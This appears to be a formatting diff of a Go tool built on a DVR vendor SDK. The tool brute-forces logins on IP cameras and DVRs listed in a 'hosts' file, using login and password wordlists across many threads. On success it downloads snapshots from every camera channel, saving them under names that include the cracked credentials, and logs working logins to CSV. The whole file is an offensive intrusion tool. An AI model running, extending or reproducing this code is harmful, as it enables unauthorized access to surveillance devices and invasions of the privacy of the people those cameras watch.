@@ -5,36 +5,36 @@ package main
 */
 import "C"
 import (
-	"strconv"
+	"bufio"
+	"encoding/binary"
+	"encoding/csv"
+	"flag"
 	"fmt"
-	"unsafe"
-	"sync"
 	"net"
 	"os"
-	"bufio"
-	"flag"
-	"encoding/binary"
+	"strconv"
+	"sync"
 	"time"
-	"encoding/csv"
+	"unsafe"
 	// "encoding/json"
 	"github.com/fatih/color"
 )
 
-var threads        int
-var bf_threads     int
-var port           uint16
-var ping           bool
-var logins_file    string
+var threads int
+var bf_threads int
+var port uint16
+var ping bool
+var logins_file string
 var passwords_file string
-var shoots_path    string
-var json_file      string
-var csv_file       string
-var m3u_file       string
+var shoots_path string
+var json_file string
+var csv_file string
+var m3u_file string
 
-var logins    []string
+var logins []string
 var passwords []string
 
-var err  *color.Color
+var err *color.Color
 var info *color.Color
 var warn *color.Color
 var succ *color.Color
@@ -58,7 +58,7 @@ type DeviceInfo struct {
 // }
 
 func HPRPing(ip string) bool {
-	request := []byte {
+	request := []byte{
 		0x00, 0x00, 0x00, 0x20, 0x63, 0x00, 0x00, 0x00,
 		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
@@ -67,21 +67,21 @@ func HPRPing(ip string) bool {
 
 	var response [16]byte
 
-	conn, err := net.DialTimeout("tcp", ip + ":" + strconv.Itoa(int(port)), 3 * time.Second)
-	if (err != nil) {
+	conn, err := net.DialTimeout("tcp", ip+":"+strconv.Itoa(int(port)), 3*time.Second)
+	if err != nil {
 		return false
 	}
 	defer conn.Close()
 
-	conn.SetDeadline(time.Now().Add(5*time.Second))
+	conn.SetDeadline(time.Now().Add(5 * time.Second))
 
 	err = binary.Write(conn, binary.LittleEndian, request)
-	if (err != nil) {
+	if err != nil {
 		return false
 	}
 
 	err = binary.Read(conn, binary.LittleEndian, &response)
-	if (err != nil) {
+	if err != nil {
 		return false
 	}
 
@@ -91,12 +91,12 @@ func HPRPing(ip string) bool {
 func getSnapshots(ip string, uid int64, startChannel int, count int, login string, password string) {
 	downloaded := 0
 
-	for i := startChannel; i < startChannel + count; i++ {
+	for i := startChannel; i < startChannel+count; i++ {
 		filename := fmt.Sprintf("%s%s_%s_%s_%d.jpg", shoots_path, login, password, ip, i)
 
 		var imgParams C.NET_DVR_JPEGPARA
 		imgParams.wPicQuality = 0
-		imgParams.wPicSize    = 0
+		imgParams.wPicSize = 0
 
 		result := C.NET_DVR_CaptureJPEGPicture(
 			(C.LONG)(uid),
@@ -105,7 +105,7 @@ func getSnapshots(ip string, uid int64, startChannel int, count int, login strin
 			C.CString(filename),
 		)
 
-		if (result == 0) {
+		if result == 0 {
 			err.Println("Error while downloading a snapshot from", ip, ":", (int)(C.NET_DVR_GetLastError()))
 		} else {
 			os.Chmod(filename, 0644)
@@ -113,8 +113,7 @@ func getSnapshots(ip string, uid int64, startChannel int, count int, login strin
 		}
 	}
 
-
-	if (downloaded != 0) {
+	if downloaded != 0 {
 		info.Println("Downloaded", downloaded, "photos from", ip)
 	} else {
 		warn.Println("Can't get photos from", ip)
@@ -127,22 +126,22 @@ func processSnapshots(ip string, uid int64, login string, password string, devic
 	var written int32
 
 	// Getting count of IP cams
-	if (C.NET_DVR_GetDVRConfig(
+	if C.NET_DVR_GetDVRConfig(
 		(C.LONG)(uid),
 		C.NET_DVR_GET_IPPARACFG,
 		0,
 		(C.LPVOID)(unsafe.Pointer(&ipcfg)),
 		(C.DWORD)(unsafe.Sizeof(ipcfg)),
 		(*C.uint32_t)(unsafe.Pointer(&written)),
-	) >= 0) {
+	) >= 0 {
 		for i := 0; i < C.MAX_IP_CHANNEL && ipcfg.struIPChanInfo[i].byEnable == 1; i++ {
 			ip_count++
 		}
 	}
 
 	// SHIT
-	if (ip_count != 0 || device.byChanNum != 0) {
-		if (device.byChanNum != 0) {
+	if ip_count != 0 || device.byChanNum != 0 {
+		if device.byChanNum != 0 {
 			getSnapshots(
 				ip,
 				uid,
@@ -153,11 +152,11 @@ func processSnapshots(ip string, uid int64, login string, password string, devic
 			)
 		}
 
-		if (ip_count != 0) {
+		if ip_count != 0 {
 			getSnapshots(
 				ip,
 				uid,
-				(int)(device.byStartChan) + 32,
+				(int)(device.byStartChan)+32,
 				(int)(ip_count),
 				login,
 				password,
@@ -183,10 +182,10 @@ func checkLogin(ip string, login string, password string, results chan DeviceInf
 		(*C.NET_DVR_DEVICEINFO)(unsafe.Pointer(&device)),
 	))
 
-	if (uid >= 0) {
+	if uid >= 0 {
 		succ.Printf("Logged in: %s:%s@%s\n", login, password, ip)
 
-		if (shoots_path != "") {
+		if shoots_path != "" {
 			processSnapshots(ip, uid, login, password, device)
 		}
 
@@ -207,8 +206,8 @@ func checkLogin(ip string, login string, password string, results chan DeviceInf
 }
 
 func bruteforce(ip string, results chan DeviceInfo) {
-	if (ping) {
-		if (!HPRPing(ip)) {
+	if ping {
+		if !HPRPing(ip) {
 			err.Println(ip, "is dead")
 
 			return
@@ -218,7 +217,7 @@ func bruteforce(ip string, results chan DeviceInfo) {
 	found := false
 
 	bfChan := make(chan LoginData)
-	bfg    := new(sync.WaitGroup)
+	bfg := new(sync.WaitGroup)
 
 	for i := 0; i < bf_threads; i++ {
 		bfg.Add(1)
@@ -237,7 +236,7 @@ func bruteforce(ip string, results chan DeviceInfo) {
 Feeding:
 	for _, login := range logins {
 		for _, password := range passwords {
-			if (found) {
+			if found {
 				break Feeding
 			}
 
@@ -248,14 +247,12 @@ Feeding:
 
 	bfg.Wait()
 
-
-	if (!found) {
+	if !found {
 		warn.Println("Can't log into", ip)
 
 		results <- DeviceInfo{Address: CameraAddress{ip, port}}
 	}
 }
-
 
 func readLines(path string) ([]string, error) {
 	file, err := os.Open(path)
@@ -282,10 +279,10 @@ func dumpAuthCSV(file *os.File, devices *[]DeviceInfo) {
 			cam.Password,
 		})
 	}
-	
+
 	writer.Flush()
 	err := writer.Error()
-	if (err != nil) {
+	if err != nil {
 		panic(err)
 	}
 
@@ -303,7 +300,7 @@ func dumpGoodCSV(file *os.File, devices *[]CameraAddress) {
 
 	writer.Flush()
 	err := writer.Error()
-	if (err != nil) {
+	if err != nil {
 		panic(err)
 	}
 
@@ -329,7 +326,7 @@ func initialize() {
 	var err error
 
 	logins, err = readLines(logins_file)
-	if (err != nil) {
+	if err != nil {
 		fmt.Println(err)
 
 		return
@@ -337,28 +334,26 @@ func initialize() {
 	fmt.Println("Loaded", len(logins), "logins")
 
 	passwords, err = readLines(passwords_file)
-	if (err != nil) {
+	if err != nil {
 		fmt.Println(err)
 
 		return
 	}
 	fmt.Println("Loaded", len(passwords), "passwords")
 
-	
 	// Creating a directory for pics
-	if (shoots_path != "") {
-		if (string(shoots_path[len(shoots_path) - 1]) != string(os.PathSeparator)) {
+	if shoots_path != "" {
+		if string(shoots_path[len(shoots_path)-1]) != string(os.PathSeparator) {
 			shoots_path += string(os.PathSeparator)
 		}
 
 		err = os.MkdirAll(shoots_path, 0777)
-		if (err != nil) {
+		if err != nil {
 			fmt.Println(err)
 
 			return
 		}
 	}
-
 
 	fmt.Println("Starting work in", threads, "threads")
 	fmt.Println()
@@ -366,26 +361,23 @@ func initialize() {
 
 func start() {
 	// Results are stored here
-	var authorized   []DeviceInfo
+	var authorized []DeviceInfo
 	var unauthorized []CameraAddress
-
 
 	// no shadowing pls
 	var err error
 
-
 	// Creating a CSV file for results
 	var csv *os.File
-	if (csv_file != "") {
+	if csv_file != "" {
 		csv, err = os.Create(csv_file)
-		if (err != nil) {
+		if err != nil {
 			panic(err)
 		}
 		defer csv.Close()
 	}
 	defer dumpAuthCSV(csv, &authorized)
 	defer dumpGoodCSV(csv, &unauthorized)
-
 
 	// Catching results here.
 	// Is this a good practice to send a structure with empty fields?
@@ -395,17 +387,17 @@ func start() {
 
 	go func() {
 		for li := range results {
-			if (csv_file != "") {
-				if (li.Login != "") {
+			if csv_file != "" {
+				if li.Login != "" {
 					authorized = append(authorized, li)
 
-					if (len(authorized) >= 10) {
+					if len(authorized) >= 10 {
 						dumpAuthCSV(csv, &authorized)
 					}
 				} else {
 					unauthorized = append(unauthorized, li.Address)
 
-					if (len(unauthorized) >= 10) {
+					if len(unauthorized) >= 10 {
 						dumpGoodCSV(csv, &unauthorized)
 					}
 				}
@@ -413,10 +405,9 @@ func start() {
 		}
 	}()
 
-	
 	// Spawning main bruteforce coroutines
-	ipCh	:= make(chan string)
-	bg		:= new(sync.WaitGroup)
+	ipCh := make(chan string)
+	bg := new(sync.WaitGroup)
 
 	for i := 0; i < threads; i++ {
 		bg.Add(1)
@@ -428,10 +419,9 @@ func start() {
 		}()
 	}
 
-	
 	// Sending IPs to bruteforce coroutines
 	inFile, err := os.Open("hosts")
-	if (err != nil) {
+	if err != nil {
 		panic(err)
 	}
 	defer inFile.Close()
@@ -443,30 +433,27 @@ func start() {
 	}
 	close(ipCh)
 
-
 	bg.Wait()
 }
 
 func main() {
 	C.NET_DVR_Init()
 	defer C.NET_DVR_Cleanup()
-	
+
 	// No such function in windows lib
 	// C.NET_DVR_SetRecvTimeOut(3000);
 
 	parseFlags()
 
-	err  = color.New(color.FgRed,    color.Bold)
-	info = color.New(color.FgBlue,   color.Bold)
+	err = color.New(color.FgRed, color.Bold)
+	info = color.New(color.FgBlue, color.Bold)
 	warn = color.New(color.FgYellow, color.Bold)
-	succ = color.New(color.FgGreen,  color.Bold)
+	succ = color.New(color.FgGreen, color.Bold)
 
- 
 	initialize()
 
 	start()
 
-	
 	// if (json_file != "") {
 	//	 color.New(color.FgBlue, color.Bold).Println("Writing JSON to", json_file)
 
